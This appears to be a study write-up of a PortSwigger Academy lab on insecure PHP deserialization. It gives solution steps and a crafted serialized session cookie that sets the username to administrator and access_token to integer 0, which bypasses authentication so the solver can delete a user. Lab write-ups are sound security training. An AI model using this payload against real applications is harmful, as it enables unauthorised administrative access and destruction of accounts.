# Lab: Modifying serialized data types

**Official lab:** [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

## Lab idea

This challenge demonstrates how type information inside a serialized PHP object can affect application comparisons and account authorization. It practices reviewing type-sensitive logic and recognizing authentication-bypass risk.

## Vulnerability in brief
Serialization converts an object and its state into a format that can be stored or transmitted; deserialization rebuilds that data as a usable object. Insecure deserialization occurs when an application deserializes data that an attacker can control. Because object fields and, in some implementations, object types are restored, crafted data may influence application logic before or during normal use of the object. This is a vulnerability class, not a general learning or testing category.

## Solution idea
1. Log in using your own credentials.
2. In Burp Repeater, use the Inspector panel to modify the session cookie as follows: The result should look like this…
3. Click "Apply changes".
4. Send the request.
5. Change the path of your request to /admin and resend it.
6. Change the path of your request to /admin/delete?username=carlos and send the request to solve the lab.

## Payloads / key values
- `GET /my-account`
- `username`
- `13`
- `administrator`
- `0`
- `s`
- `i`
- `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
- `/admin`
- `/admin/delete?username=carlos`

## Official source
- [PortSwigger Academy: Lab: Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
